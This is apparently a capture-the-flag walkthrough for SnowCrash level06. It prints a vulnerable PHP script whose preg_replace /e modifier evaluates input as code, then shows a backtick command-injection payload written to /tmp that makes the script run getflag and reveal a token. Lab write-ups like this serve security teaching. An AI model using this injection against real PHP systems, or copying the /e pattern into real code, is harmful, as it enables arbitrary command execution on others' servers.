```
level06@SnowCrash:~$ ls
level06  level06.php

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```
Now we know the executable uses the level06.php file and requires a files to operate.

Let's check what's inside of the .php file:

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
    }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
    }
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The function x gets the content of the file in the first argument.  
Then, it takes a string with the format "[x 'zero or more of any charater']" evaluated as PHP code and replaces it with the "characters with the backreference 2" to which the function y is applied to.  

The /e modifier is a vulnerability that will allow us to inject a command such as getflag.

```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag

level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```